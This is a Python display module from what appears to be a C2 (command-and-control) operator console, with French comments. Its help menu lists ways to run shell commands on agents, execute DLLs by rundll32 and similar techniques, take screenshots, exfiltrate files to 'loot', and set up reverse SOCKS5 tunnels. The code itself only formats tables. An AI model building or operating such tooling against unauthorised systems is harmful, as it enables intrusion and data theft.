# ============================================================
#  operator/display.py — Affichage formaté pour console
#  Rôle        : Tableaux, couleurs, formatage des données
#  Importé par : commands.py, main.py
# ============================================================

from datetime import datetime
from typing import List, Dict, Any


def print_banner():
    """Bannière ASCII au démarrage."""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                    C2 Operator Console                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""")


def print_help():
    """Aide des commandes disponibles."""
    print("""
Commandes disponibles:
  list                              Liste tous les agents
  use <agent_id>                    Sélectionne un agent (mode focus)
  info <agent_id>                   Détails complets d'un agent
  back                              Quitte le mode focus
  send <agent_id> <commande>        Envoie une commande shell
  send <commande>                   Envoie à l'agent en focus

Modules d'exécution (requièrent make dll-x64) :
  module <nom> -t <tech> [args]     Exécute un module dynamique
    Techniques : rdll | rundll32 | wpr | wermgr
    Exemples   : module sysinfo -t rdll
                 module shell -t rundll32 whoami
                 module screenshot -t wpr

Commandes rapides :
  sysinfo [agent_id]                Informations système
  screenshot [agent_id]             Capture d'écran → loot/<agent_id>/
  ps [agent_id]                     Liste les processus
  upload <local> <remote>           Upload un fichier vers l'agent
  download <remote> [local]         Télécharge un fichier → loot/
  loot [agent_id|all]               Fichiers téléchargés

Tunnel SOCKS5 inversé (T1090) :
  tunnel start --socks5 :<port>     Démarre le proxy SOCKS5 via l'agent
  tunnel list                       Liste les tunnels actifs
  tunnel show [agent_id]            Détail connexions d'un tunnel
  tunnel stop [agent_id]            Arrête le tunnel
    Utilisation après start :
      curl --socks5 <srv_ip>:<port> http://cible
      proxychains <outil>

Résultats et historique :
  results [all]                     Résultats de la session
  result <task_id>                  Résultat d'une tâche précise
  history [all]                     Historique des tâches
  events [agent_id]                 Événements agents
  sessions                          Sessions opérateurs actives
  stats                             Statistiques serveur

Session :
  kill [agent_id]                   Termine l'agent [IRRÉVERSIBLE]
  logout                            Déconnexion
  help                              Cette aide
  exit                              Quitter
""")


def format_timestamp(ts: float) -> str:
    """Formate un timestamp en lisible."""
    if not ts:
        return "N/A"
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(ts)


def format_elapsed(seconds: float) -> str:
    """Formate une durée en secondes."""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    else:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"


def truncate(text: str, max_len: int = 50) -> str:
    """Tronque un texte avec ..."""
    if len(text) <= max_len:
        return text
    return text[:max_len-3] + "..."


def print_agents_table(data: Dict[str, Any]):
    """Affiche la liste des agents en tableau."""
    agents = data.get("agents", [])
    
    if not agents:
        print("Aucun agent enregistré.")
        return
    
    print(f"\n{'─' * 70}")
    print(f"{'ID':<10} {'HOSTNAME':<20} {'USER':<15} {'OS':<15} {'STATUS':<10}")
    print(f"{'─' * 70}")
    
    for agent in agents:
        status = agent.get("status", "unknown")
        status_icon = "●" if status == "online" else "○" if status == "offline" else "×"
        
        print(f"{agent['id']:<10} {truncate(agent['hostname'], 20):<20} "
              f"{truncate(agent['username'], 15):<15} {truncate(agent['os'], 15):<15} "
              f"{status_icon} {status:<8}")
    
    print(f"{'─' * 70}")
    print(f"Total: {data.get('total', 0)} | Online: {data.get('online', 0)} | "
          f"Offline: {data.get('offline', 0)}")


def print_agent_info(data: Dict[str, Any]):
    """Affiche les détails complets d'un agent."""
    agent = data.get("agent", {})
    
    print(f"\n{'=' * 60}")
    print(f"AGENT: {agent.get('id')}")
    print(f"{'=' * 60}")
    print(f"  Hostname:    {agent.get('hostname')}")
    print(f"  Username:    {agent.get('username')}")
    print(f"  OS:          {agent.get('os')}")
    print(f"  Status:      {agent.get('status')}")
    print(f"  Registered:  {format_timestamp(agent.get('registered_at'))}")
    print(f"  Last Seen:   {format_timestamp(agent.get('last_seen'))}")
    
    tasks = data.get("tasks", [])
    print(f"\n  Tasks:       {len(tasks)} total")
    
    results = data.get("results", [])
    print(f"  Results:     {len(results)} total")
    
    events = data.get("events", [])
    print(f"  Events:      {len(events)} total")
    print(f"{'=' * 60}")


def print_results(data: Dict[str, Any]):
    """Affiche les résultats."""
    results = data.get("results", [])
    
    if not results:
        print("Aucun résultat.")
        return
    
    print(f"\n{'─' * 80}")
    print(f"{'TASK ID':<14} {'AGENT':<10} {'STATUS':<10} {'OUTPUT':<40}")
    print(f"{'─' * 80}")
    
    for result in results:
        output = truncate(result.get('output', ''), 40).replace('\n', ' ')
        print(f"{result.get('task_id', 'N/A'):<14} {result.get('agent_id', 'N/A'):<10} "
              f"{result.get('status', 'N/A'):<10} {output}")
    
    print(f"{'─' * 80}")
    print(f"Total: {data.get('total', 0)}")


def print_history_table(data: Dict[str, Any]):
    """Affiche l'historique des tâches."""
    tasks = data.get("tasks", [])
    
    if not tasks:
        print("Aucune tâche dans l'historique.")
        return
    
    print(f"\n{'─' * 100}")
    print(f"{'TASK ID':<14} {'CONTEXT':<25} {'COMMAND':<30} {'STATUS':<12} {'SENT'}")
    print(f"{'─' * 100}")
    
    for task in tasks:
        status = task.get("status", "unknown")
        status_icon = "⏳" if status == "pending" else "→" if status == "delivered" else "✓" if status == "done" else "✗"
        
        context = truncate(task.get("context", f"{task.get('agent_id')}"), 25)
        command = truncate(task.get("command", ""), 30)
        sent = format_timestamp(task.get("created_at"))
        
        print(f"{task.get('task_id', 'N/A'):<14} {context:<25} {command:<30} "
              f"{status_icon} {status:<10} {sent}")
    
    print(f"{'─' * 100}")
    print(f"Total: {data.get('total', 0)}")


def print_events(data: Dict[str, Any]):
    """Affiche les événements."""
    events = data.get("events", [])
    
    if not events:
        print("Aucun événement.")
        return
    
    print(f"\n{'─' * 80}")
    print(f"{'TIME':<20} {'AGENT':<10} {'EVENT':<15} {'DETAILS'}")
    print(f"{'─' * 80}")
    
    for event in events:
        ts = format_timestamp(event.get("timestamp"))
        print(f"{ts:<20} {event.get('agent_id', 'N/A'):<10} "
              f"{event.get('event_type', 'N/A'):<15} {event.get('details', '')}")
    
    print(f"{'─' * 80}")


def print_sessions_table(data: Dict[str, Any]):
    """Affiche les sessions actives."""
    sessions = data.get("sessions", [])
    
    if not sessions:
        print("Aucune session active.")
        return
    
    print(f"\n{'─' * 80}")
    print(f"{'TOKEN':<20} {'OPERATOR':<15} {'CREATED':<20} {'TASKS'}")
    print(f"{'─' * 80}")
    
    for session in sessions:
        token_short = session.get("token", "")[:17] + "..."
        created = format_timestamp(session.get("created_at"))
        print(f"{token_short:<20} {session.get('operator_name', 'N/A'):<15} "
              f"{created:<20} {session.get('task_count', 0)}")
    
    print(f"{'─' * 80}")
    print(f"Active sessions: {data.get('total_active', 0)}")


def print_stats(data: Dict[str, Any]):
    """Affiche les statistiques."""
    print(f"\n{'=' * 60}")
    print("STATISTIQUES SERVEUR")
    print(f"{'=' * 60}")
    
    agents = data.get("agents", {})
    print(f"\nAgents:")
    print(f"  Total:   {agents.get('total', 0)}")
    print(f"  Online:  {agents.get('online', 0)}")
    print(f"  Offline: {agents.get('offline', 0)}")
    
    tasks = data.get("tasks", {})
    print(f"\nTasks:")
    print(f"  Total:     {tasks.get('total', 0)}")
    print(f"  Pending:   {tasks.get('pending', 0)}")
    print(f"  Delivered: {tasks.get('delivered', 0)}")
    print(f"  Done:      {tasks.get('done', 0)}")
    print(f"  Error:     {tasks.get('error', 0)}")
    
    sessions = data.get("sessions", {})
    print(f"\nSessions:")
    print(f"  Active: {sessions.get('active', 0)}")
    
    print(f"\n{'=' * 60}")


def print_result_detail(data: Dict[str, Any]):
    """Affiche le détail d'un résultat."""
    result = data.get("result", {})
    task = data.get("task", {})
    
    print(f"\n{'=' * 60}")
    print(f"RESULTAT TASK: {result.get('task_id')}")
    print(f"{'=' * 60}")
    print(f"Agent:       {result.get('agent_id')}")
    print(f"Status:      {result.get('status')}")
    print(f"Received:    {format_timestamp(result.get('received_at'))}")
    print(f"\nCommande:    {task.get('command', 'N/A')}")
    print(f"\n{'─' * 60}")
    print("OUTPUT:")
    print(f"{'─' * 60}")
    print(result.get("output", "Aucune sortie"))
    print(f"{'=' * 60}")


def print_loot_table(data: Dict[str, Any]):
    """Affiche les fichiers téléchargés (loot)."""
    files = data.get("files", [])
    
    print(f"\n{'=' * 80}")
    print(f"LOOT - Agent {data.get('agent_id', 'N/A')}")
    print(f"{'=' * 80}")
    
    if not files:
        print("Aucun fichier téléchargé")
        return
    
    print(f"{'FILENAME':<30} {'SIZE':<12} {'RECEIVED':<20}")
    print(f"{'─' * 80}")
    
    for file in files:
        filename = file.get("filename", "N/A")
        size = file.get("size", 0)
        received = format_timestamp(file.get("received_at", ""))
        
        # Format taille lisible
        if size >= 1024 * 1024:
            size_str = f"{size / (1024 * 1024):.1f} MB"
        elif size >= 1024:
            size_str = f"{size / 1024:.1f} KB"
        else:
            size_str = f"{size} bytes"
        
        print(f"{filename:<30} {size_str:<12} {received}")
    
    print(f"{'─' * 80}")
    print(f"Total: {len(files)} fichiers")
    print(f"Total size: {sum(f.get('size', 0) for f in files)} bytes")
    print(f"{'─' * 60}")